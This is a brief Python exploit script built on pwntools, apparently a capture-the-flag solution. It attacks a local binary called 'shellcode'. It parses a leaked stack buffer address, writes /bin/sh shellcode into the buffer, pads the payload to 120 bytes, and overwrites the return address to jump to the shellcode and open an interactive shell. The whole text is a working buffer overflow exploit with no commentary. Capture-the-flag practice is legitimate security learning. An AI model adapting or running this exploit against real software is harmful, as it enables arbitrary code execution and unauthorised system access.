from pwn import *
context.arch = 'amd64'

p = process('./shellcode')

shellcode = asm(shellcraft.sh())
p.recvuntil('is ')
buf = int(p.recvline().strip(),16)
payload = shellcode + b'a'*(120-len(shellcode)) + p64(buf)
p.send(payload)

p.interactive()